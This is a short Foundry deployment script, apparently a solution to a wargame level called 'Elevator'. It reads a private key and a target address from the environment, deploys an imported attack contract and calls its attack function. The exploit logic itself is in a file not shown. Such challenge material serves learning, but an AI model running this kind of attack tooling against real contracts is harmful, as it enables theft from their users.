// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import {ElevatorAttack} from "../src/ElevatorAttack.sol";

contract ElevatorAttackScript is Script {
    function run() external {
        // 從環境變數讀取私鑰和目標實例地址
        uint256 deployerPk = vm.envUint("PRIVATE_KEY");
        address target = vm.envAddress("INSTANCE_ADDRESS");

        vm.startBroadcast(deployerPk);

        // 1. 佈署攻擊合約
        ElevatorAttack attacker = new ElevatorAttack(target);
        
        // 2. 執行攻擊
        attacker.attack();

        vm.stopBroadcast();

        console.log("Attack finished. Checking status...");
    }
}
